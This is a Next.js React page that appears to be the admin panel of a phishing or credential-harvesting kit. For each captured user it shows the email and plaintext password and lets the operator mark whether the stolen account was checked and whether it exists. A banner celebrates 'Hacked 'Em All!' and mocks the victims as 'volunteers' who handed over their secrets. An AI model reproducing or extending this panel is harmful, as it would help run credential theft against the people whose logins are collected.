"use client";
import axios from 'axios';
import Link from 'next/link';
import React, { useEffect, useState } from 'react';
import { BsArrowLeft } from 'react-icons/bs';

import { toast } from 'react-toastify';

function Page({ params }) {
    const [user, setUser] = useState({});
    const [isLoaded, setIsLoaded] = useState(true);
    const [update, setUpdate] = useState({ account: "", status: "" })
    const fetchData = async () => {
        try {
            await axios.get(`http://localhost:3000/api/user`, { params: { id: params.user } })
                .then(res => {
                    setIsLoaded(false);
                    setUser(res.data.message);
                    setUpdate({ account: user.account, status: user.status });
                });
        } catch (error) {
            console.log(error.message);
        }
    }
    const onChangeHandler = async (e) => {
        const name = e.target.name;
        setUpdate(prev => ({ ...prev, [name]: e.target.value }));

    }
    const submitHandler = async (e) => {
        e.preventDefault();
        try {
            await axios.put(`http://localhost:3000/api/user`, { account: update.account, status: update.status }, { params: { id: user._id } })
                .then(res => {
                    console.log(res.data.message);
                    toast.success(res.data.message);
                })
        } catch (error) {
            toast.error(error.message);
            console.log(error.message);
        }
    }

    useEffect(() => {
        fetchData();
    }, []);

    return (
        <main>
            {isLoaded ?
                <div className='flex min-h-screen items-center justify-center'>
                    <span className='w-16 h-16 border-4 block border-teal-600 rounded-full border-r-teal-100 animate-spin'></span>
                </div>
                :
                <div className='p-5 md:py-10 md:px-20'>
                    <section>
                        <nav className='border-b border-teal-600 pb-3 flex items-center justify-between'>
                            <h1 className='text-teal-600 text-xl font-semibold'>/ {user.email}'s profile detail</h1>
                            <Link href="/admin">
                                <BsArrowLeft className='text-teal-600 text-2xl font-extrabold' />
                            </Link>
                        </nav>
                    </section>
                    <section>
                        <div className='py-10'>
                            <div>
                                <p className='text-lg py-2 text-gray-600'>Email: <span className='font-light text-lg'>{user ? user.email : <></>}</span></p>
                                <p className='text-lg py-2 text-gray-600'>Password: <span className='font-light text-lg'>{user ? user.password : <></>}</span></p>
                            </div>
                            <form className='border-b mb-10' onSubmit={submitHandler}>
                                {/* Status */}
                                <div className='py-2 flex items-end gap-2'>
                                    <p className='text-lg text-gray-600'>Status: </p>
                                    <select name='status' onChange={onChangeHandler} className='bg-transparent border rounded py-1 outline-none text-gray-500'>
                                        <option value="pending">pending</option>
                                        <option value="succuss">succuss</option>
                                        <option value="failed">failed</option>
                                    </select>
                                </div >
                                {/* account */}
                                <div className='py-2 flex items-end gap-2'>
                                    <p className='text-lg text-gray-600'>Account:</p>
                                    <select name='account' onClick={onChangeHandler} className='bg-transparent border rounded py-1 outline-none text-gray-500'>
                                        <option value="checking">checking</option>
                                        <option value="existed">existed</option>
                                        <option value="Not existed">Not existed</option>
                                    </select>
                                </div>
                                <button type='submit' className='bg-teal-600 hover:bg-teal-400 transition-bg duration-500 text-white py-1 px-4 rounded my-5'>update</button>
                            </form>
                            {/* message */}
                            <div className='text-center md:max-w-[80%] mx-auto'>
                                <h1 className='text-xl pb-2 md:text-2xl'>Mission Accomplished: Hacked 'Em All!</h1>
                                <p className='text-sm md:text-lg font-light text-gray-800'>Behold the spoils of your digital conquest. Here’s the rundown of all the “volunteers” who handed over their secrets. Enjoy responsibly!</p>
                            </div>
                        </div>
                    </section>

                </div>
            }
        </main>

    )
}

export default Page;
